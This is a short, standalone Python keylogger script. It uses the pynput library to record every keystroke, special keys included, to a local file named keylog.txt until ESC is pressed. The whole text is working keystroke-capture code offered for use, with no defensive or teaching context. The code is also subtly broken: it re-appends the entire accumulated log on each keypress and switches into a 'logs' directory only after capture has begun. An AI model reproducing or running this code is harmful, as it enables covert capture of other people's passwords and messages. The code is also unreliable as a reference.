

import pynput.keyboard
import os
import sys
sys.path.append('/path/to/your/python/environment/lib/python3.11/site-packages')
import pynput

log = ""  # Initialize an empty string to store keystrokes

# Function to handle key press events
def on_press(key):
    global log
    try:
        # Check if the pressed key has a character attribute and is not None
        if hasattr(key, 'char') and key.char is not None:
            log += key.char
        else:
            # Handle special keys and modifiers
            log += f" {key} "
    except AttributeError:
        # Handle special keys that don't have 'char' attribute
        log += f" {key} "

    # Write the log to the file
    write_log(log)

# Function to write the log to a file
def write_log(log):
    with open("keylog.txt", "a") as file:
        file.write(log)

# Function to handle key release events
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # If the Escape key is pressed, stop the keylogger
        return False

# Start the keylogger
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Notify the user that the keylogger is running
    print("Keylogger is running. Press ESC to stop.")

    # Create a directory to store logs if it doesn't exist
    if not os.path.exists("logs"):
        os.makedirs("logs")

    # Change the current working directory to the 'logs' directory
    os.chdir("logs")

    # Join the listener thread to keep the keylogger running
    listener.join()
